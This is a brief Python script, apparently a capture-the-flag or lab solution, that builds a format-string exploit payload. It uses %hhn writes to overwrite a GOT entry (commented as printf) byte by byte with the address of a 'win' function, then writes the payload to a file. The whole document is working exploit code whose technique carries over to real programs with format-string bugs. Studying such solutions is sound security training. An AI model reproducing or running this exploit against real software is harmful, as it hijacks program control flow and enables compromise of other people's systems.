#!/usr/bin/env python3


win_addr = 0x080491B6
# printf函数地址
got_addr = 0x0804C010

payload = b''
num_char = 0

payload += (got_addr+0).to_bytes(4, 'little')
payload += (got_addr+1).to_bytes(4, 'little')
payload += (got_addr+2).to_bytes(4, 'little')
payload += (got_addr+3).to_bytes(4, 'little')
num_char = 16

inc = (0x100 + ((win_addr >> 0) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%17$hhn'

inc = (0x100 + ((win_addr >> 8) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%18$hhn'

inc = (0x100 + ((win_addr >> 16) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%19$hhn'

inc = (0x100 + ((win_addr >> 24) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%20$hhn'


with open("input", "wb") as f:
    f.write(payload)
